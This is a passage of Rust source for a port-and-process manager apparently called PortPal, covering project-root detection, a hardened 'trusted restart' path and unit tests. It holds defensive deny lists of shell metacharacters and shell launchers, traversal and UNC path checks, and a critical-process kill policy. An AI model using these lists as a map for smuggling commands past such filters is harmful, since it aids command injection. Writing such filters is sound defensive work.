    // detect zombie state for processes we didn't spawn.
    #[cfg(target_os = "linux")]
    {
        if let Ok(stat) = std::fs::read_to_string(format!("/proc/{}/stat", pid)) {
            // Format: "pid (comm) state ..." — the state field is the single
            // character after the closing paren.
            if let Some(rest) = stat.rsplit(')').next() {
                let state = rest.trim_start().chars().next().unwrap_or('?');
                if state == 'Z' {
                    return false; // zombie
                }
            }
        }
    }

    true
}

// ─── Shared helpers ───────────────────────────────────────────────────────────

/// Memoized project-root probe: scans run every 2s with dozens of processes,
/// and each uncached probe is up to 6 levels x 8 markers of `exists()` I/O.
/// Cache is keyed by the raw start path (not canonicalized), so the same
/// directory reached via different spellings / symlinks probes once per
/// spelling. The map is size-capped at ~512 entries by clearing the whole map
/// on overflow (full flush, not LRU eviction).
/// Cache hits are returned as-is with no existence check, so scan callers
/// display whatever was found at probe time: a renamed/deleted folder shows a
/// stale path until the entry is flushed. Only `build_launch_record`
/// revalidates, by canonicalizing the returned root (fail-closed, so restart
/// stays unavailable when the path is gone).
fn project_root_cache() -> &'static Mutex<HashMap<PathBuf, Option<PathBuf>>> {
    static CACHE: LazyLock<Mutex<HashMap<PathBuf, Option<PathBuf>>>> =
        LazyLock::new(|| Mutex::new(HashMap::new()));
    &CACHE
}

fn find_project_root(start: &std::path::Path) -> Option<std::path::PathBuf> {
    // Fast path: memoized probe (cap ~512 entries, full clear on overflow).
    let key = start.to_path_buf();
    if let Ok(cache) = project_root_cache().lock() {
        if let Some(hit) = cache.get(&key) {
            return hit.clone();
        }
    }
    let found = find_project_root_uncached(start);
    if let Ok(mut cache) = project_root_cache().lock() {
        if cache.len() > 512 {
            cache.clear();
        }
        cache.insert(key, found.clone());
    }
    found
}

fn find_project_root_uncached(start: &std::path::Path) -> Option<std::path::PathBuf> {
    let markers = [
        "package.json",
        "Cargo.toml",
        "go.mod",
        "pyproject.toml",
        "requirements.txt",
        "pom.xml",
        "build.gradle",
        ".git",
    ];
    let mut dir = start.to_path_buf();
    for _ in 0..6 {
        for marker in &markers {
            if dir.join(marker).exists() {
                return Some(dir);
            }
        }
        if !dir.pop() {
            break;
        }
    }
    None
}

fn extract_project_name(path: &Option<String>) -> Option<String> {
    path.as_ref()
        .and_then(|p| std::path::Path::new(p).file_name())
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
}

// ─── Trusted restart ─────────────────────────────────────────────────────────
//
// The frontend may never hand the backend a command line or a working
// directory: an attacker with script execution in the webview would otherwise
// own the user's account. Instead every scan records vetted launch metadata for
// the processes it observed, keyed by (port, pid), and `restart_trusted` is
// only allowed to replay one of those records.

/// Launch metadata captured from a live process during a scan. Never built
/// from IPC input.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct LaunchRecord {
    /// argv[0] exactly as the OS reported it.
    pub program: String,
    /// argv[1..] exactly as the OS reported it.
    pub args: Vec<String>,
    /// Canonical working directory, always inside `root`.
    pub cwd: PathBuf,
    /// Canonical project root that jails `cwd` (and absolute programs).
    pub root: PathBuf,
}

type TrustedLaunches = HashMap<(u16, u32), LaunchRecord>;

fn trusted_launches() -> &'static Mutex<TrustedLaunches> {
    static TRUSTED: LazyLock<Mutex<TrustedLaunches>> = LazyLock::new(|| Mutex::new(HashMap::new()));
    &TRUSTED
}

/// Handles of processes that `spawn_trusted` started, keyed by `(port, pid)`.
/// Without holding these, PortPal becomes the parent but never calls `wait()`,
/// so the child turns into a zombie once it exits. The tray poll loop calls
/// `reap_children()` every tick to harvest finished processes.
type SpawnedChildren = HashMap<(u16, u32), Child>;

fn spawned_children() -> &'static Mutex<SpawnedChildren> {
    static CHILDREN: LazyLock<Mutex<SpawnedChildren>> =
        LazyLock::new(|| Mutex::new(HashMap::new()));
    &CHILDREN
}

/// Reaps finished child processes so they don't linger as zombies.
///
/// Called once per tray-poll tick (every 2 s). Each stored `Child` is probed
/// with `try_wait()` — a non-blocking call that reaps the zombie if the
/// process has exited, or returns `Ok(None)` if it is still running.
pub fn reap_children() {
    if let Ok(mut children) = spawned_children().try_lock() {
        children.retain(|_key, child| {
            match child.try_wait() {
                // Process exited — zombie reaped. Remove from map.
                Ok(Some(_status)) => false,
                // Still running — keep it.
                Ok(None) => true,
                // Error (shouldn't happen) — remove to avoid retrying forever.
                Err(_) => false,
            }
        });
    }
}

/// Interpreters a dev server is allowed to be relaunched through when the
/// program lives outside the project root (e.g. a global node install).
const ALLOWED_PROGRAMS: &[&str] = &[
    "node", "npm", "npx", "pnpm", "yarn", "bun", "deno", "cargo", "python", "python3", "go",
];

/// Anything a shell could interpret. We never invoke a shell, but rejecting
/// these keeps the door shut if a future caller ever does.
const FORBIDDEN_CHARS: &[char] = &[
    '&', '|', ';', '$', '`', '(', ')', '<', '>', '"', '\'', '*', '?', '~', '#', '%', '!', '{', '}',
    '[', ']', '^', '\n', '\r', '\t',
];

/// Rejects a token that a shell (or a path walker) could reinterpret.
pub fn reject_unsafe_token(token: &str, kind: &str) -> Result<(), String> {
    if token.is_empty() {
        return Err(format!("empty {}", kind));
    }
    if let Some(bad) = token
        .chars()
        .find(|c| FORBIDDEN_CHARS.contains(c) || c.is_control())
    {
        return Err(format!("{} contains an unsafe character {:?}", kind, bad));
    }
    if token.split(['/', '\\']).any(|part| part == "..") {
        return Err(format!("{} contains a parent-directory traversal", kind));
    }
    Ok(())
}

/// True for `\\server\share` style paths, which escape any local jail.
fn is_unc(path: &Path) -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::path::{Component, Prefix};
        if let Some(Component::Prefix(prefix)) = path.components().next() {
            return matches!(prefix.kind(), Prefix::UNC(..) | Prefix::VerbatimUNC(..));
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    {
        path.to_string_lossy().starts_with("\\\\")
    }
}

/// Canonicalizes `dir` and asserts it resolves to an existing directory under
/// `root`. Rejects traversal, UNC, `~`, and unexpanded environment variables.
fn canonicalize_jailed(dir: &Path, root: &Path) -> Result<PathBuf, String> {
    let raw = dir.to_string_lossy();
    if raw.is_empty() {
        return Err("working directory is empty".into());
    }
    if raw.contains('~') || raw.contains('%') || raw.contains('$') || raw.contains('\0') {
        return Err("working directory contains an unexpanded or unsafe token".into());
    }
    // Note: `is_unc` inspects the path prefix, so Windows verbatim disk paths
    // (`\\?\C:\…`, what `canonicalize` returns) are not mistaken for UNC.
    if is_unc(dir) {
        return Err("working directory is a UNC path".into());
    }
    if dir
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("working directory contains a parent-directory traversal".into());
    }

    let canonical = std::fs::canonicalize(dir)
        .map_err(|e| format!("working directory does not resolve: {}", e))?;
    if !canonical.is_dir() {
        return Err("working directory is not a directory".into());
    }
    if is_unc(&canonical) {
        return Err("working directory resolves to a UNC path".into());
    }
    if !canonical.starts_with(root) {
        return Err("working directory escapes the project root".into());
    }
    Ok(canonical)
}

/// Matches `program`'s file name against [`ALLOWED_PROGRAMS`], refusing any
/// executable extension that Windows would run through a shell (`.bat`/`.cmd`).
fn program_basename_allowed(program: &str) -> bool {
    let Some(name) = Path::new(program).file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    let lower = name.to_ascii_lowercase();
    let stem = lower.strip_suffix(".exe").unwrap_or(&lower);
    if stem.contains('.') {
        return false; // .bat, .cmd, .ps1, … are shell-interpreted launchers
    }
    ALLOWED_PROGRAMS.contains(&stem)
}

/// Full re-validation of a record. Run when the record is built *and* again
/// immediately before spawning, so a stale store cannot outlive the filesystem.
pub fn validate_launch_record(record: &LaunchRecord) -> Result<(), String> {
    reject_unsafe_token(&record.program, "program")?;
    reject_shell_launcher(Path::new(&record.program))?;
    for arg in &record.args {
        reject_unsafe_token(arg, "argument")?;
    }

    if !record.root.is_absolute() || is_unc(&record.root) {
        return Err("project root is not a local absolute path".into());
    }
    if !record.cwd.starts_with(&record.root) {
        return Err("working directory escapes the project root".into());
    }
    canonicalize_jailed(&record.cwd, &record.root)?;

    let program = Path::new(&record.program);
    if program.is_absolute() {
        let canonical = std::fs::canonicalize(program)
            .map_err(|e| format!("program does not resolve: {}", e))?;
        reject_shell_launcher(&canonical)?;
        if is_unc(&canonical) {
            return Err("program resolves to a UNC path".into());
        }
        // An absolute program is allowed either because it is a known
        // interpreter, or because it lives inside the jail.
        if !program_basename_allowed(&record.program) && !canonical.starts_with(&record.root) {
            return Err(format!(
                "program {:?} is neither an allowed interpreter nor inside the project root",
                record.program
            ));
        }
    } else if Path::new(&record.program).components().count() != 1 {
        return Err("relative program paths are not allowed".into());
    } else if !program_basename_allowed(&record.program) {
        return Err(format!(
            "program {:?} is not an allowed interpreter",
            record.program
        ));
    }

    Ok(())
}

/// Project-local programs must obey the same no-shell rule as global ones.
/// Rust implicitly invokes cmd.exe for Windows batch files, even with args().
fn reject_shell_launcher(program: &Path) -> Result<(), String> {
    let name = program
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let stem = name.strip_suffix(".exe").unwrap_or(&name);
    if [".cmd", ".bat", ".ps1"]
        .iter()
        .any(|ext| name.ends_with(ext))
        || [
            "cmd",
            "powershell",
            "pwsh",
            "sh",
            "bash",
            "dash",
            "zsh",
            "fish",
            "ksh",
            "csh",
            "tcsh",
        ]
        .contains(&stem)
    {
        return Err("shell launchers cannot be restarted; use the native server executable".into());
    }
    Ok(())
}

/// Builds a vetted record from what the OS reported about a live process.
/// Returns `None` (restart simply stays unavailable) whenever anything about
/// the process fails validation — the fail-closed path.
fn build_launch_record(cmd: &[String], cwd: Option<&Path>) -> Option<LaunchRecord> {
    let program = cmd.first()?.trim().to_string();
    if program.is_empty() {
        return None;
    }
    let args: Vec<String> = cmd.iter().skip(1).map(|a| a.to_string()).collect();

    let cwd = cwd?;
    let root = std::fs::canonicalize(find_project_root(cwd)?).ok()?;
    let cwd = canonicalize_jailed(cwd, &root).ok()?;

    let record = LaunchRecord {
        program,
        args,
        cwd,
        root,
    };
    validate_launch_record(&record).ok()?;
    Some(record)
}

/// Spawns a vetted record directly — no `cmd /C`, no `sh -c`, no string
/// splitting. On Windows the child gets its own console so a dev server stays
/// visible, without routing through a command interpreter.
///
/// Returns the `Child` handle so the caller can store it for reaping (on Unix
/// the parent must eventually `wait()` to prevent zombies).
fn spawn_trusted(record: &LaunchRecord) -> Result<Child, String> {
    let mut command = Command::new(&record.program);
    command.args(&record.args).current_dir(&record.cwd);

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
        command.creation_flags(CREATE_NEW_CONSOLE);
    }

    command.spawn().map_err(|e| e.to_string())
}

/// True when `pid` is still listening on `port`. The scan error is propagated
/// rather than collapsed into `false`, so a broken scan aborts the restart
/// instead of looking like a process that already stopped.
fn port_is_listening_with(port: u16, pid: u32, ports: &[PortInfo]) -> bool {
    ports.iter().any(|p| p.port == port && p.pid == pid)
}

/// Restarts the process recorded for `(port, pid)` during the last scan.
///
/// The only inputs from the frontend are the port and the pid; everything that
/// reaches the OS comes from the trusted store. Shared by `lib.rs` and
/// `main.rs` so both entry points behave identically.
pub fn restart_trusted(port: u16, pid: u32) -> Result<(), String> {
    let record = trusted_launches()
        .lock()
        .map_err(|_| "trusted launch store is poisoned".to_string())?
        .get(&(port, pid))
        .cloned()
        .ok_or_else(|| {
            format!(
                "no trusted launch record for port {} (pid {}); rescan and try again",
                port, pid
            )
        })?;

    // The store may have been recorded seconds or hours ago; re-check it
    // against the filesystem before anything is executed.
    validate_launch_record(&record)?;

    // Claimed here, before the process is looked at at all, for the same reason
    // `kill_pid` claims it first: every check below — the recorded command line,
    // the listener scan, `kill_pid_with`'s policy — then describes the process
    // this will terminate. Harmless when the process is already gone: the kill
    // branch is skipped and the claim is dropped unused.
    let target = KillTarget::acquire(pid);

    // If the process is still alive it must be the same process we recorded —
    // otherwise the pid was reused and killing it would hit a bystander.
    let mut sys = System::new();
    sys.refresh_processes();
    if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
        let live: Vec<String> = process.cmd().to_vec();
        let recorded: Vec<String> = std::iter::once(record.program.clone())
            .chain(record.args.iter().cloned())
            .collect();
        if live != recorded {
            return Err(format!("pid {} no longer matches the recorded launch", pid));
        }
        let ports = try_scan_ports().map_err(|e| e.message)?;
        if !port_is_listening_with(port, pid, &ports) {
            return Err(format!("pid {} no longer listens on port {}", pid, port));
        }

        // Remove the old child handle so `wait()` on drop reaps it (the kill
        // path needs the zombie collected before we can reliably detect exit).
        if let Ok(mut children) = spawned_children().lock() {
            if let Some(mut old) = children.remove(&(port, pid)) {
                // Non-blocking reap; the kill_pid call below handles the actual
                // termination, we just don't want the handle leaked.
                let _ = old.try_wait();
            }
        }

        kill_pid_with(pid, &ports, target).map_err(|e| e.message)?;
        // Wait for the old process to actually disappear instead of assuming a
        // fixed delay covers it. Behaviour on timeout is unchanged: the
        // replacement is still spawned, so this only ever returns sooner than
        // the previous unconditional 800ms sleep.
        let mut probe = System::new();
        wait_until(RESTART_SETTLE, || process_has_exited(&mut probe, pid));
    }

    let child = spawn_trusted(&record)?;
    let new_pid = child.id();

    // Store the handle so the tray poll loop can reap it later.
    if let Ok(mut children) = spawned_children().lock() {
        children.insert((port, new_pid), child);
    }

    Ok(())
}

// ─── Test helpers (pure, no OS calls) ───────────────────────────────────────

/// Mirrors the address handling of `scan_windows` for tests that cannot run
/// `netstat`. The parsing itself lives in `netaddr`.
#[cfg(test)]
pub(crate) fn parse_netstat_port(addr: &str) -> Option<u16> {
    parse_port(addr)
}

/// Mirrors the NAME-column handling of `scan_unix`: the address is the last
/// token, or the one before it when `lsof` appended a `(LISTEN)` state token.
#[cfg(test)]
pub(crate) fn parse_lsof_name_parts(parts: &[&str]) -> Option<u16> {
    if parts.len() < 9 {
        return None;
    }
    let mut idx = parts.len() - 1;
    if parts[idx].starts_with('(') {
        if idx == 0 {
            return None;
        }
        idx -= 1;
    }
    parse_port(parts[idx])
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn listener(pid: u32, port: u16, name: &str) -> PortInfo {
        PortInfo {
            pid,
            port,
            process_name: name.into(),
            project_path: None,
            project_name: None,
            protocol: "TCP".into(),
            start_cmd: None,
            cwd: None,
        }
    }

    #[test]
    fn wait_until_returns_immediately_when_already_finished() {
        // The regression this guards: the old code paid the full grace period
        // even when the process was already gone.
        let started = Instant::now();
        assert!(wait_until(Duration::from_secs(30), || true));
        assert!(
            started.elapsed() < Duration::from_millis(100),
            "waited {:?}",
            started.elapsed()
        );
    }

    #[test]
    fn wait_until_returns_soon_after_the_condition_flips() {
        let deadline = Instant::now() + Duration::from_millis(120);
        let started = Instant::now();
        // Finishes far short of the timeout, so the call must too.
        assert!(wait_until(Duration::from_secs(30), || Instant::now() >= deadline));
        assert!(
            started.elapsed() < Duration::from_secs(1),
            "waited {:?}",
            started.elapsed()
        );
    }

    #[test]
    fn wait_until_gives_up_after_the_timeout() {
        let started = Instant::now();
        assert!(!wait_until(Duration::from_millis(100), || false));
        // It waited the budget rather than returning early or hanging.
        assert!(started.elapsed() >= Duration::from_millis(100));
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "waited {:?}",
            started.elapsed()
        );
    }

    #[test]
    fn missing_tool_is_a_typed_error_not_a_panic() {
        // The historical bug: a missing binary panicked and took down the app
        // and the tray thread. It must now be a recoverable, typed error.
        let error =
            run_scan_tool("portpal-no-such-tool-exists", &[], "list listening ports").unwrap_err();
        assert_eq!(error.code, "tool_missing");
        assert_eq!(error.tool, "portpal-no-such-tool-exists");
        assert!(
            error.message.contains("not found on PATH"),
            "{}",
            error.message
        );
        // The message names the capability that breaks, not "port scanning"
        // for every tool: on Linux the connection reader is a different binary.
        assert!(
            error.message.contains("list listening ports"),
            "{}",
            error.message
        );
    }

    #[test]
    fn preflight_covers_every_tool_this_platform_needs() {
        // The regression: preflight ran the listing scan only. On Linux that
        // exercises `lsof` and never touches `ss`, so a box with one but not
        // the other started without a warning and then showed an edgeless port
        // map with every connection count at 0.
        let (listing, listing_args) = listing_tool();
        let (conns, conns_args) = crate::connections::connections_tool();
        assert!(!listing.is_empty() && !listing_args.is_empty());
        assert!(!conns.is_empty() && !conns_args.is_empty());

        // Each preflight attributes its own binary, so the startup log says
        // which dependency to install.
        if let Err(e) = preflight() {
            assert_eq!(e.tool, listing, "{}", e.message);
        }
        if let Err(e) = crate::connections::preflight() {
            assert_eq!(e.tool, conns, "{}", e.message);
        }
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn linux_depends_on_two_distinct_tools() {
        // Linux is the platform where the two capabilities do not share a
        // binary, which is what made the single-tool preflight insufficient.
        assert_eq!(listing_tool().0, "lsof");
        assert_eq!(crate::connections::connections_tool().0, "ss");
        assert_ne!(listing_tool().0, crate::connections::connections_tool().0);
    }

    #[cfg(unix)]
    #[test]
    fn path_fallback_rejects_user_writable_tool_locations() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempdir().unwrap();
        let tool = dir.path().join("netstat");
        fs::write(&tool, "fake").unwrap();
        fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).unwrap();

        assert!(!is_safe_external_tool_path(&tool));
    }

    #[test]
    fn nonzero_exit_is_an_error_rather_than_an_empty_port_list() {
        // A tool that runs but fails leaves stdout empty. Reporting that as
        // "no ports are listening" would silently hide a broken scan.
        #[cfg(target_os = "windows")]
        let (tool, args): (&str, &[&str]) = ("cmd", &["/C", "exit 1"]);
        #[cfg(not(target_os = "windows"))]
        let (tool, args): (&str, &[&str]) = ("sh", &["-c", "exit 1"]);

        let error = run_scan_tool(tool, args, "list listening ports").unwrap_err();
        assert_eq!(error.code, "tool_failed");
    }

    #[test]
    fn successful_tool_returns_its_stdout() {
        #[cfg(target_os = "windows")]
        let (tool, args): (&str, &[&str]) = ("cmd", &["/C", "echo portpal"]);
        #[cfg(not(target_os = "windows"))]
        let (tool, args): (&str, &[&str]) = ("sh", &["-c", "echo portpal"]);

        assert!(run_scan_tool(tool, args, "list listening ports")
            .unwrap()
            .contains("portpal"));
    }

    // ─── Windows kill path ───────────────────────────────────────────────
    //
    // These drive real processes this test spawns itself, never a process found
    // on the machine: the policy guards are unit-tested above, and a live
    // destructive check against a system service is not acceptable verification
    // (see docs/kill-policy.md).

    /// A child that stays alive until the test stops it. `pause` blocks on a
    /// stdin nothing ever writes, so no sleep tool and no network are involved.
    #[cfg(target_os = "windows")]
    fn spawn_blocked_child() -> std::process::Child {
        Command::new("cmd")
            .args(["/C", "pause"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("spawn test child")
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_policy_outranks_a_handle_that_cannot_be_opened() {
        // PID 4 is the Windows System process: a PROCESS_TERMINATE handle for it
        // can never be opened. The user must be told it is protected, not
        // invited to relaunch PortPal as administrator and try again — which is
        // what surfacing the handle failure first would have said.
        let error = kill_pid(4).unwrap_err();
        assert_ne!(error.code, "access_denied", "{}", error.message);
        assert!(
            matches!(error.code, "critical_process" | "not_observed"),
            "{}: {}",
            error.code,
            error.message
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_open_rejects_a_pid_that_is_not_running() {
        // Windows PIDs are multiples of four and allocated from the low end of
        // the range, so this one is not a live process on any real machine.
        let error = match ProcessHandle::open(0x7FFF_FFF0) {
            Ok(_) => panic!("opened a handle to a pid that should not exist"),
            Err(error) => error,
        };
        assert_eq!(error.code, "not_observed", "{}", error.message);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_stop_ends_the_process_without_paying_the_grace_period() {
        let mut child = spawn_blocked_child();
        let pid = child.id();
        let handle = ProcessHandle::open(pid).expect("open own child");

        let started = Instant::now();
        handle.stop().expect("stop the child");
        let elapsed = started.elapsed();

        // Gone, by the kernel's account rather than by a PID lookup.
        assert!(
            handle.wait_for_exit(Duration::ZERO),
            "child outlived stop()"
        );
        // Whichever branch ran — WM_CLOSE accepted and honoured, or straight to
        // force because there was no window — the caller is not billed the full
        // grace period for a process that is already gone.
        assert!(
            elapsed < GRACEFUL_STOP_GRACE,
            "stop() took {elapsed:?}, the whole grace period"
        );
        let _ = child.wait();
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_graceful_close_precedes_the_force() {
        // The regression: Windows only ever force-killed, while the confirmation
        // dialog warned about unsaved data. `stop()` must ask first — and when
        // asking is impossible (a windowless console server, which is most dev
        // servers) it must say so by falling through to the force immediately,
        // not by waiting out a grace period nothing can answer.
        let mut child = spawn_blocked_child();
        let handle = ProcessHandle::open(child.id()).expect("open own child");

        let asked = handle.request_close();
        if asked {
            // Windows accepted the WM_CLOSE, so the grace period is meaningful.
            assert!(
                handle.wait_for_exit(GRACEFUL_STOP_GRACE),
                "taskkill reported success but the process never closed"
            );
        } else {
            // Nothing to post to: the process must still be running, which is
            // what makes the immediate escalation in `stop()` correct.
            assert!(!handle.wait_for_exit(Duration::from_millis(200)));
            handle.terminate().expect("force the child");
        }
        assert!(handle.wait_for_exit(Duration::from_secs(5)));
        let _ = child.wait();
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_handle_pins_the_pid_against_reuse() {
        // The TOCTOU fix rests on one documented Windows guarantee: a PID stays
        // reserved while a handle to that process is open. Observable proof: the
        // PID still resolves after the process has exited, because it is still
        // this process object and cannot have been handed to another.
        let mut child = spawn_blocked_child();
        let pid = child.id();
        let pinning = ProcessHandle::open(pid).expect("open own child");
        pinning.terminate().expect("terminate the child");
        assert!(pinning.wait_for_exit(Duration::from_secs(5)));
        let _ = child.wait();

        // Still openable, still the same dead process, because `pinning` lives.
        let second = ProcessHandle::open(pid).expect("pid was released while a handle was open");
        assert!(
            second.wait_for_exit(Duration::ZERO),
            "pid now names a live process"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_terminate_succeeds_on_a_process_that_already_exited() {
        // `TerminateProcess` fails with access-denied on an already-terminated
        // process. That is not a failed kill: the port is free, so the caller
        // must not see an error.
        let mut child = spawn_blocked_child();
        let handle = ProcessHandle::open(child.id()).expect("open own child");
        handle.terminate().expect("first terminate");
        assert!(handle.wait_for_exit(Duration::from_secs(5)));

        handle
            .terminate()
            .expect("terminating an exited process is success");
        let _ = child.wait();
    }

    #[test]
    fn port_snapshot_lookup_does_not_scan_again() {
        let ports = vec![listener(4242, 3000, "node")];

        assert!(port_is_listening_with(3000, 4242, &ports));
        assert!(!port_is_listening_with(3001, 4242, &ports));
    }

    #[test]
    fn kill_is_refused_when_the_port_list_is_unavailable() {
        // An empty list must never read as "this pid is harmless": the
        // critical-process guard has nothing to check against, so the kill is
        // refused rather than allowed through.
        assert!(validate_kill(4242, &[], &[]).is_err());
    }

    #[test]
    fn kill_policy_rejects_unknown_and_reserved_pids() {
        for pid in [0, 1, u32::MAX, i32::MAX as u32 + 1] {
            assert_eq!(
                validate_kill(pid, &[listener(pid, 3000, "node")], &[])
                    .unwrap_err()
                    .code,
                "invalid_pid"
            );
        }
        assert_eq!(
            validate_kill(42, &[], &[]).unwrap_err().code,
            "not_observed"
        );
        assert_eq!(kill_pid(0).unwrap_err().code, "invalid_pid");
        assert_eq!(kill_pid(1).unwrap_err().code, "invalid_pid");
        assert_eq!(kill_pid(u32::MAX).unwrap_err().code, "invalid_pid");
    }

    #[test]
    fn kill_policy_rejects_critical_names_and_any_protected_listener() {
        for name in [
            "system",
            "SVCHOST.EXE",
            "lsass",
            "Postgres",
            "redis-server",
            "mysqld.exe",
            "mongod",
        ] {
            assert_eq!(
                validate_kill(42, &[listener(42, 3000, name)], &[])
                    .unwrap_err()
                    .code,
                "critical_process"
            );
        }
        let ports = [listener(42, 3000, "node"), listener(42, 5432, "node")];
        assert_eq!(
            validate_kill(42, &ports, &[]).unwrap_err().code,
            "critical_process"
        );
        assert!(validate_kill(42, &[listener(42, 9000, "node")], &[9000]).is_err());
        assert!(validate_kill(42, &[listener(42, 3000, "node")], &[]).is_ok());
    }

    #[test]
    fn kill_policy_rejects_a_critical_listener_even_when_another_pid_shares_the_port() {
        let ports = vec![listener(111, 3000, "node"), listener(222, 3000, "postgres")];
        let error = validate_kill(222, &ports, &[]).unwrap_err();
        assert_eq!(error.code, "critical_process");
    }

    #[test]
    fn restart_unknown_endpoint_fails_before_spawning() {
        let error = restart_trusted(65534, 4_294_967_290).unwrap_err();
        assert!(error.contains("no trusted launch record"));
    }

    #[test]
    fn extract_project_name_some() {
        let p = Some("C:/Users/123da/PycharmProjects/PortPal".to_string());
        assert_eq!(extract_project_name(&p), Some("PortPal".to_string()));
        let p2 = Some("C:/a/b/c".to_string());
        assert_eq!(extract_project_name(&p2), Some("c".to_string()));
    }

    #[test]
    fn extract_project_name_none() {
        assert_eq!(extract_project_name(&None), None);
        let p = Some("".to_string());
        // Path::new("").file_name() == None
        assert_eq!(extract_project_name(&p), None);
    }

    #[test]
    fn find_project_root_direct_marker() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        let sub = dir.path().join("a/b");
        fs::create_dir_all(&sub).unwrap();
        let found = find_project_root(&sub);
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_cargo_toml() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
        let found = find_project_root(dir.path());
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_git_marker() {
        let dir = tempdir().unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        let found = find_project_root(dir.path());
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_none_within_6_levels() {
        let dir = tempdir().unwrap();
        let deep = dir.path().join("a/b/c/d/e/f/g");
        fs::create_dir_all(&deep).unwrap();
        // marker only at top, but deep is 7 levels down -> not found
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        let found = find_project_root(&deep);
        assert_eq!(found, None);
    }

    #[test]
    fn find_project_root_parent_traversal() {
        let dir = tempdir().unwrap();
        let lvl1 = dir.path().join("level1");
        let lvl2 = lvl1.join("level2");
        fs::create_dir_all(&lvl2).unwrap();
        fs::write(lvl1.join("go.mod"), "module x").unwrap();
        let found = find_project_root(&lvl2);
        assert_eq!(found, Some(lvl1));
    }

    #[test]
    fn parse_netstat_port_ipv4_and_ipv6() {
        assert_eq!(parse_netstat_port("0.0.0.0:3000"), Some(3000));
        assert_eq!(parse_netstat_port("127.0.0.1:5173"), Some(5173));
        assert_eq!(parse_netstat_port("[::]:1420"), Some(1420));
        assert_eq!(parse_netstat_port("10.0.0.5:49664"), Some(49664));
        assert_eq!(parse_netstat_port(":::8080"), Some(8080));
        assert_eq!(parse_netstat_port("invalid"), None);
        assert_eq!(parse_netstat_port("0.0.0.0:abc"), None);
    }

    #[test]
    fn parse_lsof_without_listen_suffix() {
        let parts: Vec<&str> = "node 1234 user 10u IPv4 0x... 0t0 TCP *:3000"
            .split_whitespace()
            .collect();
        assert_eq!(parse_lsof_name_parts(&parts), Some(3000));
    }

    #[test]
    fn parse_lsof_with_listen_suffix_pr8() {
        // PR #8: lsof appends "(LISTEN)" as separate token
        let line = "node 1234 user 10u IPv4 0x... 0t0 TCP *:3000 (LISTEN)";
        let parts: Vec<&str> = line.split_whitespace().collect();
        // The ports.len()-1 is "(LISTEN)", must fall back to previous token
        assert_eq!(parse_lsof_name_parts(&parts), Some(3000));
        let line2 = "com.apple 5678 user 11u IPv6 0x... 0t0 TCP [::1]:5173 (LISTEN)";
        let parts2: Vec<&str> = line2.split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts2), Some(5173));
    }

    #[test]
    fn parse_lsof_too_short() {
        let parts: Vec<&str> = "a b c".split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), None);
    }

    #[test]
    fn parse_netstat_port_ipv6_edge_cases() {
        // Zone-scoped link-local addresses, as netstat prints them on Windows
        // (numeric zone) and lsof on macOS (interface name).
        assert_eq!(parse_netstat_port("[fe80::1%12]:8080"), Some(8080));
        assert_eq!(parse_netstat_port("fe80::1%en0:8080"), Some(8080));
        // An address with no port at all is not a listener on the last group.
        assert_eq!(parse_netstat_port("2001:db8::8080"), None);
        assert_eq!(parse_netstat_port("::1"), None);
        // Wildcards and unnumbered ports stay rejected.
        assert_eq!(parse_netstat_port("*:*"), None);
        assert_eq!(parse_netstat_port("[::]"), None);
    }

    #[test]
    fn parse_lsof_name_ipv6_edge_cases() {
        let line = "node 1234 user 10u IPv6 0x... 0t0 TCP [fe80::1%en0]:8080 (LISTEN)";
        let parts: Vec<&str> = line.split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), Some(8080));

        // Some builds glue the state token to the address.
        let glued = "node 1234 user 10u IPv6 0x... 0t0 TCP [::1]:5173(LISTEN)";
        let parts: Vec<&str> = glued.split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), Some(5173));

        // A row with no port (lsof prints these for some socket states).
        let portless = "node 1234 user 10u IPv6 0x... 0t0 TCP fe80::1%en0 (LISTEN)";
        let parts: Vec<&str> = portless.split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), None);
    }

    #[test]
    fn reserved_pids_are_zero_and_one_everywhere() {
        // What may not be acted on: one definition, shared by both kill guards.
        assert!(is_reserved_pid(0));
        assert!(is_reserved_pid(1));
        assert!(!is_reserved_pid(2));
        assert!(!is_reserved_pid(4321));
    }

    #[test]
    fn only_pid_zero_is_unlistable() {
        // What may not be shown is a narrower rule than what may not be
        // killed: PID 0 names no process, but PID 1 owns real bound ports
        // through systemd socket activation and must stay visible.
        assert!(is_unattributed_pid(0));
